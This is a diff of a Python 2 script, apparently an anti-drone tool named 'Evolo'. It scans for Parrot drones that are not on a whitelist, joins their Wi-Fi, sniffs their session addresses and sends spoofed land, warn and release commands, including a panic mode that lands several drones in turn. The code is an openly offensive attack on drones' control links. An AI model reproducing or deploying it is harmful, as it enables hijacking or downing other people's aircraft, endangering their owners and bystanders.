@@ -4,7 +4,8 @@ import threading
 from evolo import *
 
 #global constants
-interface = "wlan0"
+interfaceForScan = "wlan0"
+interfaceToConnect = "wlan1"
 
 ############################
 #Process for normal attacks#
@@ -12,55 +13,57 @@ interface = "wlan0"
 def attack(parrotsAP):
 	global attackInProgress, underattack
 	print "Attack started"
-
-	if not connectTo(parrotsAP, interface):
+	
+	if not connectTo(parrotsAP, interfaceToConnect):
 		print "Could not connect to parrot at", parrotsAP.ssid, ", exiting"
 		underattack = []
 		attackInProgress = 0
 		return
-
+	
 	if attackInProgress == 2: #if panic mode started, quit
 		return
-
-	signalStrength = getWifiStrength(interface)
-
+	
+	wifiDistance = getWifiDistance(interfaceToConnect, parrotsAP)
+	
 	print "Succesfully connected to", parrotsAP.ssid
-
-	srcMAC, dstMAC, srcIP, dstIP, seqNR = sniffParrotCommunication(interface)
-
+	
+	srcMAC, dstMAC, srcIP, dstIP, segNr = sniffParrotCommunication(interfaceToConnect)
+	
 	if attackInProgress == 2: #if panic mode started, quit
 		return
-
+	
 	if srcMAC != "": #only attack if sniffing was successfull. Otherwise simply quit
 		if mode == "Aggressive":
-			sendSpoofedParrotPacket("land", interface, srcMAC, dstMAC, srcIP, dstIP, seqNR, 10) #send 10 land packet
+			sendSpoofedParrotPacket("land", interfaceToConnect, srcMAC, dstMAC, srcIP, dstIP, segNr, 10) #send 10 land packet
 		elif mode == "Moderate":
-			sendSpoofedParrotPacket("warn", interface, srcMAC, dstMAC, srcIP, dstIP, seqNR, 10)
-			sleep(10)
-
+			sendSpoofedParrotPacket("warn", interfaceToConnect, srcMAC, dstMAC, srcIP, dstIP, segNr, 10)
+			print "Wait for 5 seconds"
+			sleep(5) #original idea was 10 here, I changed it to 5 for debugging
+			print "Wait ended"
 			if attackInProgress == 2: #if panic mode started, quit
 				return
-
-			sendSpoofedParrotPacket("release", interface, srcMAC, dstMAC, srcIP, dstIP, 1, 1)
+			print "Send release packet"
+			sendSpoofedParrotPacket("release", interfaceToConnect, srcMAC, dstMAC, srcIP, dstIP, 1, 1)
+			print "Wait 5 seconds"
 			sleep(5)
-
+			print "Wait ended"
 			if attackInProgress == 2: #if panic mode started, quit
 				return
-
-			if getWifiStrength(interface) > 0: #if the drone is still in wifi range land it
-				sendSpoofedParrotPacket("land", interface, srcMAC, dstMAC, srcIP, dstIP, seqNR, 10)
+			print "If still here, land it"
+			if getWifiDistance(interfaceToConnect, parrotsAP) > 0: #if the drone is still in wifi range land it
+				sendSpoofedParrotPacket("land", interfaceToConnect, srcMAC, dstMAC, srcIP, dstIP, segNr, 10)
 		elif mode == "Gracious":
-			while getWifiStrength(interface) > 0: #while the drone is in wifi range
-				if signalStrength * 1.1 < getWifiStrength(interface): #if it is coming closer, land it
-					sendSpoofedParrotPacket("land", interface, srcMAC, dstMAC, srcIP, dstIP, seqNR, 10)
+			while getWifiDistance(interface, parrotsAP) > 0: #while the drone is in wifi range
+				if wifiDistance * 1.1 > getWifiDistance(interfaceToConnect, parrotsAP): #if it is coming closer, land it
+					sendSpoofedParrotPacket("land", interfaceToConnect, srcMAC, dstMAC, srcIP, dstIP, segNr, 10)
 				else: #otherwise warn again
-					sendSpoofedParrotPacket("warn", interface, srcMAC, dstMAC, srcIP, dstIP, seqNR, 10)
+					sendSpoofedParrotPacket("warn", interfaceToConnect, srcMAC, dstMAC, srcIP, dstIP, segNr, 10)
 					sleep(10)
-
+					
 					if attackInProgress == 2: #if panic mode started, quit
 						return
-
-					sendSpoofedParrotPacket("release", interface, srcMAC, dstMAC, srcIP, dstIP, 1, 1)
+					
+					sendSpoofedParrotPacket("release", interfaceToConnect, srcMAC, dstMAC, srcIP, dstIP, 1, 1)
 					sleep(5)
 					if attackInProgress == 2: #if panic mode started, quit
 						return
@@ -69,7 +72,7 @@ def attack(parrotsAP):
 	#if attack finished, clean up the global variables
 	underattack = []
 	attackInProgress = 0
-	disconnectFromWifi(interface)
+	disconnectFromWifi(interfaceToConnect)
 	print "Attack finished"
 
 ##########################################
@@ -79,20 +82,24 @@ def panicMode():
 	global underattack, attackInProgress
 	while len(underattack) > 0:
 		current = underattack.pop(0) #get the first parrot
-		if not connectTo(current, interface):
+		if not connectTo(current, interfaceToConnect):
 			continue #skip if unable to connect
-		srcMAC, dstMAC, srcIP, dstIP, seqNR = sniffParrotCommunication(interface)
+		srcMAC, dstMAC, srcIP, dstIP, segNr = sniffParrotCommunication(interfaceToConnect)
 		if srcMAC == "":
 			continue #skip if sniffing timeouts
-		sendSpoofedParrotPacket("land", interface, srcMAC, dstMAC, srcIP, dstIP, seqNR, 10) #send 10 land packet
+		sendSpoofedParrotPacket("land", interfaceToConnect, srcMAC, dstMAC, srcIP, dstIP, segNr, 10) #send 10 land packet
 	attackInProgress = 0
-	disconnectFromWifi(interface)
+	disconnectFromWifi(interfaceToConnect)
 
 #####################
 #Program starts here#
 #####################
 if __name__ == '__main__':
 	print "Evolo has started"
+	disconnectFromWifi(interfaceForScan)
+	disconnectFromWifi(interfaceToConnect)
+	sleep(5)
+	print "Evolo is ready for operation"
 	global mode, config, underattack, attackInProgress, attackT
 	underattack = []
 	attackInProgress = 0 #0 - no attack, 1 - normal attack, 2 - panic mode
@@ -102,7 +109,7 @@ if __name__ == '__main__':
 		mode = readKnobState()
 		print "mode: ", mode
 		whitelist, config = readConfig()
-		newParrots = scanForParrots(interface, whitelist, underattack)
+		newParrots = scanForParrots(interfaceForScan, whitelist, underattack)
 		if len(newParrots) > 0: #only work if there are new drones nearby
 			if attackInProgress == 0 and len(newParrots) == 1: #no attack in progress, only one parrot found
 				underattack = getAPsMAC(newParrots)
@@ -119,7 +126,7 @@ if __name__ == '__main__':
 			elif attackInProgress == 1: #if there is a normal attack in progress, but there is an other parrot coming
 				attackInProgress = 2
 				#attackT.terminate() #can't terminate a thread
-				disconnectFromWifi(interface)
+				disconnectFromWifi(interfaceToConnect)
 				underattack += getAPsMAC(newParrots)
 				panicModeT = threading.Thread(target=panicMode, args=())
 				panicModeT.daemon = True
